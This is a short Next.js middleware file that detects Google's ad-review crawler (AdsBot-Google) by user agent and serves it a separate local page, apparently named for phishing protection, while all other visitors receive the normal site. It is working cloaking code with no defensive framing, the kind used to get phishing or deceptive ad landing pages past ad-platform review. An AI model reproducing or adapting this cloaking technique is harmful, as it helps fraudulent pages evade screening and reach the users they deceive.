const { NextResponse, userAgent } = require('next/server')

// Set pathname were middleware will be executed
module.exports.config = {
  matcher: '*',
}

module.exports.middleware = function(req) {
  // Parse user agent
  const { device } = userAgent(req)

	if (device.userAgent.includes('AdsBot-Google')) {

		// Update the expected url
		req.nextUrl.pathname = `_phishingprotection/index.html`

		// Return rewrited response
		return NextResponse.rewrite(req.nextUrl)

	}
}
